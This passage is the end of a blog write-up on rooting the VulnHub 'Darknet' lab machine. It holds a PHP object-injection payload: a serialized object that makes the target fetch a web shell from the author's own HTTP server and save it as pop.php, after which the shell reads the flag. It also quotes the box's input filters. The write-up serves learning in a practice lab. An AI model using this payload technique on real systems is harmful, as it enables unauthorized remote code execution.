$test-&gt;path = '/var/www';

print_r(serialize([$test, new Show()]));
</code></pre><p>Running this would then print out the serialized versions of the two classes in question.</p>
<pre tabindex=0><code>root@kali:~/data/VulnHub/Darknet# php poi.php
a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:35:&quot;http://192.168.252.1:8000/shell.txt&quot;;s:9:&quot;name_file&quot;;s:7:&quot;pop.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;;}i:1;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;N;}}
</code></pre><p>The only thing that is left to do is host the <code>shell.txt</code> file at the location specified in the <code>$url</code> property and run the little python helper with the new serialized string. I started up a HTTP server with <code>python -m SimpleHTTPServer</code> and wrote my web shell to <code>shell.txt</code>. The python helper was changed so that <code>OBJECT</code> had the new serialized string.</p>
<pre tabindex=0><code>OBJECT = &quot;&quot;&quot;a:2:{i:0;O:4:&quot;Test&quot;:3:{s:3:&quot;url&quot;;s:35:&quot;http://192.168.252.1:8000/shell.txt&quot;;s:9:&quot;name_file&quot;;s:7:&quot;pop.php&quot;;s:4:&quot;path&quot;;s:8:&quot;/var/www&quot;;}i:1;O:4:&quot;Show&quot;:1:{s:4:&quot;woot&quot;;N;}}&quot;&quot;&quot;
</code></pre><p>I ran the helper and saw that the <code>shell.txt</code> was downloaded from my web server. I could now browse to http://192.168.252.140/pop.php :D</p>
<h2 id=flag>flag<a hidden class=anchor aria-hidden=true href=#flag>#</a></h2>
<p>Using the shell uploaded, I was finally able to cat the flag!</p>
<figure>
<img loading=lazy src=/images/darknet_flag.png>
</figure>
<h2 id=final-thoughts>final thoughts<a hidden class=anchor aria-hidden=true href=#final-thoughts>#</a></h2>
<p>I went back to a few of the source files to get an idea for whats going on once the box was rooted. The first being the weirdness when I tried to brute force the first elements of the node in the XPath injection. Turns out, a <code>preg_match()</code> was applied to filter out a few inputs.</p>
<pre tabindex=0><code>if(!empty($_GET['id'])){
    $id=$_GET['id'];
    if(preg_match('/\*/', $id)){
        exit();
}
</code></pre><p>Next, the original SQL injection bug was also filtering out some input.</p>
<pre tabindex=0><code>if(preg_match(&quot;/select|and|[&gt;,=&lt;\-;]/&quot;, $user)){
    echo &quot;Ilegal&quot;;
    exit();
</code></pre><p>In the end, I learnt a lot! Thanks <a href=https://twitter.com/Q3rv0>@Q3rv0</a></p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2016/07/09/awesome-nmap-grep/>
<span class=title>« Prev Page</span>
<br>
<span>awesome nmap grep</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/>
<span class=title>Next Page »</span>
<br>
<span>kerberos, kerberoast and golden tickets</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on twitter" href="https://twitter.com/intent/tweet/?text=rooting%20darknet&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet&summary=rooting%20darknet&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f&title=rooting%20darknet"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on whatsapp" href="https://api.whatsapp.com/send?text=rooting%20darknet%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share rooting darknet on telegram" href="https://telegram.me/share/url?text=rooting%20darknet&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2016%2f06%2f16%2frooting-darknet%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>